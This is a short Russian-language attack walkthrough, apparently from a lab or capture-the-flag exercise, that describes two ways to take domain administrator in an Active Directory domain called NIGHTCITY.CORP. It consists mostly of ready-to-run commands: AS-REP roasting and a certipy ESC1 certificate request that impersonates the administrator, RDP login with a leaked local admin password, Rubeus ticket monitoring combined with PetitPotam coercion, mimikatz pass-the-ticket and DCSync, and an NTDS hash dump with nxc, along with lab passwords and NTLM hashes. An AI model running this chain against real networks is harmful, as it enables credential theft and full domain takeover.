# Requirements
[NXC](https://www.netexec.wiki/getting-started/installation/installation-on-unix)
[PetitPotam](https://github.com/topotam/PetitPotam)
[Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe)
[mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe)


## Первый вариант взятия ДОМЕН АДМИНА
  asrep roasting r3n0, (пароль `P@ssw0rd`). Через certipy видно что от данного пользака можно сделать ESC1. 
```certipy-ad req -u R3n0 -hashes 8f81de1111733d3a03cdcfd31ae696de -dc-ip 172.31.200.102 -ca nightcity-DC-02-CA -template Faraday -upn administrator@NIGHTCITY.CORP -debug```

```sudo apt install ntpdate && sudo ntpdate 172.31.200.101```

```certipy-ad auth -pfx administrator.pfx -dc-ip 172.31.200.101 -debug```


## Второй вариант взятия ДОМЕН АДМИНА
На шаре pacifica\Dogtown - лежал пароль локал админа этой тачки. Видим что pacifica имеет права неограниченного дегерирования. Заходит на хост по рдп ```xfreerdp /v:172.31.200.111 /u:David /p:D@v1d_l0v#s_LuCy  /dynamic-resolution +clipboard```, закидываем rubeus.exe. Ставим ```.\Rubeus.exe monitor /interval:5``` Параллельно делаем petitpotam.py скачать с гита. ```python3 PetitPotam.py pacifica.NIGHTCITY.CORP 172.31.200.101```. В окне рубеусе появляется новый билетик для DC-01.
![типа такого будет](https://habrastorage.org/r/w1560/getpro/habr/upload_files/abe/6dd/48d/abe6dd48dd0602f5780b37462f13ffc7.png)
Теперь закидываем еще мимик на тачку
```
[IO.File]::WriteAllBytes("C:\Users\David\Desktop\ticket-filename.kirbi", [Convert]::FromBase64String(“base64-ticket”))
Mimikatz.exe
privilege::debug
kerberos::ptt C:\Users\David\Desktop\ticket-filename.kirbi
lsadump::dcsync /user:Administrator
```
Остается получить ntds ```nxc smb 172.31.200.101 -u Administrator -H 90c1e25b12005c3146f13228043aa87d  --ntds```
